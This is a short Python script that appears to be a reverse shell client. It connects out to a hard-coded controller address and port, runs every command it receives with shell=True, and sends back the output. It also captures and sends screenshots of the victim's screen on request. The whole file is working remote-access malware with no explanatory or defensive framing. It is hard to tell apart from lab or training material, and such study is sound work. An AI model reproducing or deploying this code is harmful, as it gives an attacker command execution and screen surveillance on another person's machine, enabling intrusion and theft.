import socket,os,subprocess 
from mss import mss

def screen_capture():
    with mss() as sct:
        sct.shot(output="screenshot.png")
        print('done')
        
#create socket 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host="192.168.11.107"
port=12345

#connect

s.connect((host,port))

while True:
    # receive command
    command = s.recv(1024).decode("utf-8")
    if command == 'goodbye':
        s.send(b'close')
        s.close()
        break
    elif command == 'screenshot':
        screen_capture()
        len_img = str(os.path.getsize("screenshot.png"))
        s.send(len_img.encode('utf-8'))
        with open('screenshot.png', 'rb') as f:
             s.send(f.read())
    #receive cd          
    elif command == 'cd':
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        s.send(result.stdout.read())
    elif command[:2] == 'cd':
        if os.path.exists(str(command[3:].replace("\n", ""))):
            os.chdir(str(command[3:].replace("\n", "")))
            s.send(os.popen("cd").read().encode("utf-8"))
            
    else:
        r=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        result=r.communicate()
        if result[1]:
            s.send(result[1])
        else:
            s.send(result[0])


